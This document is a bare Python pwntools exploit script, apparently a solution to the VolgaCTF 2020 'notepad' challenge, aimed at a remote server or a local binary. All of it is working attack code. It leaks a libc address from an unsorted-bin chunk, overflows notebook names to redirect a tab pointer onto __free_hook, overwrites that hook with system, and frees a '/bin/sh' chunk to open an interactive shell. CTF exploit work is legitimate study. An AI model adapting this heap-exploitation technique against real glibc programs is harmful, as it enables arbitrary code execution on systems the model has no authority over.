#!/usr/bin/env python3
from pwn import *

if args.REMOTE:
    io = remote('notepad.q.2020.volgactf.ru', 45678)
else:
    io = process(['./notepad.dbg'])


def add_notebook(io, name):
    io.recvuntil('> ')
    io.sendline('a')
    io.recvuntil('Enter notebook name: ')
    io.sendline(name)


def pick_notebook(io, index):
    io.recvuntil('> ')
    io.sendline('p')
    io.recvuntil('Enter index of a notebook to pick: ')
    io.sendline(str(index))


def add_tab(io, name, data_length, data):
    io.recvuntil('> ')
    io.sendline('a')
    io.recvuntil('Enter tab name: ')
    io.sendline(str(name))
    io.recvuntil('Enter data length (in bytes): ')
    io.sendline(str(data_length))
    io.recvuntil('Enter the data: ')
    io.sendline(data)


def view_tab(io, index):
    io.recvuntil('> ')
    io.sendline('v')
    io.recvuntil('Enter index of a tab to view: ')
    io.sendline(str(index))


def delete_tab(io, index):
    io.recvuntil('> ')
    io.sendline('d')
    io.recvuntil('Enter index of tab to delete: ')
    io.sendline(str(index))


def back_to_notebooks(io):
    io.recvuntil('> ')
    io.sendline('q')


def update_tab(io, index, name, data_length, data):
    io.recvuntil('> ')
    io.sendline('u')
    io.recvuntil('Enter index of tab to update: ')
    io.sendline(str(index))
    io.recvuntil('Enter new tab name (leave empty to skip): ')
    io.sendline(name)
    io.recvuntil('Enter new data length (leave empty to keep the same): ')
    io.sendline(str(data_length))
    io.recvuntil('Enter the data: ')
    io.sendline(data)


add_notebook(io, 'notebook')
pick_notebook(io, 1)
add_tab(io, 'big', 5000, '')
add_tab(io, 'small', 8, b'/bin/sh\x00')
delete_tab(io, 1)  # big -> unsorted bin
add_tab(io, 'leak', 16, '')
view_tab(io, 2)  # leak
leak = io.recvn(16)
_, bin = struct.unpack('<QQ', leak)
print(f'bin = 0x{bin:016x}')
libc = bin - 0x3ec2d0
print(f'libc = 0x{libc:016x}')
assert libc & 0xfff == 0
free_hook = libc + 0x3ed8e8
system = libc + 0x4f440
back_to_notebooks(io)

sizeof_notebook = 0x818
offsetof_tabs = 0x18
offsetof_data = 0x18
sizeof_filler = sizeof_notebook * 8 + offsetof_tabs + offsetof_data
filler = b'prep' * (sizeof_filler // 4)
add_notebook(io, filler + struct.pack('<Q', free_hook))
sizeof_filler -= 1
for _ in range(7):
    sizeof_filler -= sizeof_notebook + 1
    add_notebook(io, filler[:sizeof_filler] + b'\x08')
add_notebook(io, 'almost')
pick_notebook(io, 10)
update_tab(io, 1, '', '', struct.pack('<Q', system))
back_to_notebooks(io)

pick_notebook(io, 1)
delete_tab(io, 1)

io.interactive()
